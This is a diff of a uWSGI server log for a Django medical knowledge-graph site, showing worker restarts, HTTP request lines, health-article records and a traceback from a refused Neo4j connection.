+Gracefully killing worker 2 (pid: 26647)...
+Gracefully killing worker 3 (pid: 26648)...
+Gracefully killing worker 4 (pid: 26649)...
 worker 1 buried after 1 seconds
 worker 2 buried after 1 seconds
 worker 3 buried after 1 seconds
 worker 4 buried after 1 seconds
-goodbye to uWSGI.
-*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 17:56:20 2019] ***
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Thu Mar 21 02:28:23 2019] ***
 compiled with version: 8.3.0 on 16 March 2019 06:35:56
 os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
 nodename: VM_0_13_centos
@@ -1349,7 +505,6 @@ clock source: unix
 pcre jit disabled
 detected number of CPU cores: 1
 current working directory: /root/MHKG/Django
-writing pidfile to logs/uwsgi.pid
 detected binary path: /usr/local/bin/uwsgi
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
@@ -1359,11 +514,11 @@ your memory page size is 4096 bytes
 detected max file descriptor number: 100001
 lock engine: pthread robust mutexes
 thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to TCP address 127.0.0.1:8000 fd 3
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0xd47920
+Python main interpreter initialized at 0xe7f240
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 python threads support enabled
@@ -1371,95 +526,27 @@ your server socket listen backlog is limited to 100 connections
 your mercy for graceful operations on workers is 60 seconds
 mapped 416880 bytes (407 KB) for 8 cores
 *** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 3 seconds on interpreter 0xd47920 pid: 13370 (default app)
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xe7f240 pid: 976 (default app)
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 *** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 13370)
-spawned uWSGI worker 1 (pid: 13373, cores: 2)
-spawned uWSGI worker 2 (pid: 13374, cores: 2)
-spawned uWSGI worker 3 (pid: 13375, cores: 2)
-spawned uWSGI worker 4 (pid: 13376, cores: 2)
+gracefully (RE)spawned uWSGI master process (pid: 976)
+spawned uWSGI worker 1 (pid: 26693, cores: 2)
+spawned uWSGI worker 2 (pid: 26694, cores: 2)
+spawned uWSGI worker 3 (pid: 26695, cores: 2)
+spawned uWSGI worker 4 (pid: 26696, cores: 2)
 Python auto-reloader enabled
 数据库已存在！
+数据库已存在！
+create neo4j class ...
 create neo4j class ...
 connect succeed
+connect succeed
 数据库已存在！
-[pid: 13376|app: 0|req: 1/1] 112.10.182.10 () {44 vars in 809 bytes} [Sun Mar 17 09:56:28 2019] GET / => generated 11772 bytes in 2699 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
-299====13
-{'title': '8种食物是导致不孕不育症的“罪魁祸首”', 'abstract': '相信每个人都希望拥有自己的宝宝，但是生活中有很多人都难以实现这个愿望。其原因与饮食有着极大的关系。以下小编为大家盘点易致不孕不育的食物。', 'url': 'https://ys.99.com.cn/wuqu/600679.htm'}
-[pid: 13376|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 844 bytes} [Sun Mar 17 09:56:31 2019] GET /views/console/ => generated 13433 bytes in 413 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
-Internal Server Error: /views/consoles/
-Traceback (most recent call last):
-  File "/usr/local/lib/python3.7/site-packages/urllib3/connection.py", line 159, in _new_conn
-    (self._dns_host, self.port), self.timeout, **extra_kw)
-  File "/usr/local/lib/python3.7/site-packages/urllib3/util/connection.py", line 80, in create_connection
-    raise err
-  File "/usr/local/lib/python3.7/site-packages/urllib3/util/connection.py", line 70, in create_connection
-    sock.connect(sa)
-ConnectionRefusedError: [Errno 111] Connection refused
-
-During handling of the above exception, another exception occurred:
-
-Traceback (most recent call last):
-  File "/usr/local/lib/python3.7/site-packages/urllib3/connectionpool.py", line 600, in urlopen
-    chunked=chunked)
-  File "/usr/local/lib/python3.7/site-packages/urllib3/connectionpool.py", line 354, in _make_request
-    conn.request(method, url, **httplib_request_kw)
-  File "/usr/local/lib/python3.7/http/client.py", line 1229, in request
-    self._send_request(method, url, body, headers, encode_chunked)
-  File "/usr/local/lib/python3.7/http/client.py", line 1275, in _send_request
-    self.endheaders(body, encode_chunked=encode_chunked)
-  File "/usr/local/lib/python3.7/http/client.py", line 1224, in endheaders
-    self._send_output(message_body, encode_chunked=encode_chunked)
-  File "/usr/local/lib/python3.7/http/client.py", line 1016, in _send_output
-    self.send(msg)
-  File "/usr/local/lib/python3.7/http/client.py", line 956, in send
-    self.connect()
-  File "/usr/local/lib/python3.7/site-packages/urllib3/connection.py", line 181, in connect
-    conn = self._new_conn()
-  File "/usr/local/lib/python3.7/site-packages/urllib3/connection.py", line 168, in _new_conn
-    self, "Failed to establish a new connection: %s" % e)
-urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x7fcc0d7c7470>: Failed to establish a new connection: [Errno 111] Connection refused
-
-During handling of the above exception, another exception occurred:
-
-Traceback (most recent call last):
-  File "/usr/local/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/usr/local/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/usr/local/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "./Django/consoles_view.py", line 42, in consoles
-    result = getNode(request)
-  File "./Django/consoles_view.py", line 22, in getNode
-    result = find.matchNodeRelationbyTitle('疾病', titles[num])
-  File "./toolkit/neo4j_operation/neo4j_crud.py", line 36, in matchNodeRelationbyTitle
-    p = graph.run('match (n:' + nodeName + ')-[]-(x) where n.title="' + value + '" return n, x, id(n) as '
-  File "/usr/local/lib/python3.7/site-packages/py2neo/database.py", line 526, in run
-    return self.begin(autocommit=True).run(cypher, parameters, **kwparameters)
-  File "/usr/local/lib/python3.7/site-packages/py2neo/database.py", line 805, in run
-    entities=entities))
-  File "/usr/local/lib/python3.7/site-packages/py2neo/internal/connectors.py", line 370, in run
-    r = self._post("/db/data/transaction/%s" % (tx or "commit"), statement, hydrator.dehydrate(parameters))
-  File "/usr/local/lib/python3.7/site-packages/py2neo/internal/connectors.py", line 361, in _post
-    body=json_dumps({"statements": statements}))
-  File "/usr/local/lib/python3.7/site-packages/urllib3/request.py", line 72, in request
-    **urlopen_kw)
-  File "/usr/local/lib/python3.7/site-packages/urllib3/request.py", line 150, in request_encode_body
-    return self.urlopen(method, url, **extra_kw)
-  File "/usr/local/lib/python3.7/site-packages/urllib3/connectionpool.py", line 667, in urlopen
-    **response_kw)
-  File "/usr/local/lib/python3.7/site-packages/urllib3/connectionpool.py", line 667, in urlopen
-    **response_kw)
-  File "/usr/local/lib/python3.7/site-packages/urllib3/connectionpool.py", line 667, in urlopen
-    **response_kw)
-  File "/usr/local/lib/python3.7/site-packages/urllib3/connectionpool.py", line 638, in urlopen
-    _stacktrace=sys.exc_info()[2])
-  File "/usr/local/lib/python3.7/site-packages/urllib3/util/retry.py", line 398, in increment
-    raise MaxRetryError(_pool, url, error or ResponseError(cause))
-urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='localhost', port=7474): Max retries exceeded with url: /db/data/transaction/commit (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7fcc0d7c7470>: Failed to establish a new connection: [Errno 111] Connection refused'))
-[pid: 13376|app: 0|req: 3/3] 112.10.182.10 () {44 vars in 846 bytes} [Sun Mar 17 09:56:34 2019] GET /views/consoles/ => generated 212021 bytes in 1214 msecs (HTTP/1.1 500) 4 headers in 130 bytes (1 switches on core 0)
-[pid: 13376|app: 0|req: 4/4] 112.10.182.10 () {46 vars in 892 bytes} [Sun Mar 17 09:56:47 2019] GET /views/consoles/ => generated 11159 bytes in 3464 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
-[pid: 13376|app: 0|req: 5/5] 112.10.182.10 () {44 vars in 856 bytes} [Sun Mar 17 09:56:53 2019] GET /views/interlocution/ => generated 4135 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+数据库已存在！
+[pid: 26695|app: 0|req: 1/1] 120.199.34.100 () {44 vars in 877 bytes} [Thu Mar 21 02:28:24 2019] GET /admin_views/general/getCpuAndMemory/ => generated 30 bytes in 1647 msecs (HTTP/1.1 200) 3 headers in 114 bytes (1 switches on core 0)
+[pid: 26696|app: 0|req: 1/2] 120.199.34.100 () {42 vars in 843 bytes} [Thu Mar 21 02:28:24 2019] GET /accounts/login/code.jpg => generated 1121 bytes in 1639 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
+[pid: 26695|app: 0|req: 2/3] 120.199.34.100 () {42 vars in 825 bytes} [Thu Mar 21 02:28:27 2019] GET / => generated 11772 bytes in 21 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
+63====3
+{'title': '日常生活最错误的3种食物搭配', 'abstract': '有句成语说“对症下药”，吃水果也是有黄金时间段的，正确的区分每种水果的发挥时间，让吃进去的水果发挥最大的作用。', 'url': 'https://ys.99.com.cn/zhinan/206257.htm'}
+[pid: 26696|app: 0|req: 2/4] 120.199.34.100 () {44 vars in 891 bytes} [Thu Mar 21 02:28:27 2019] GET /views/console/ => generated 13366 bytes in 464 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
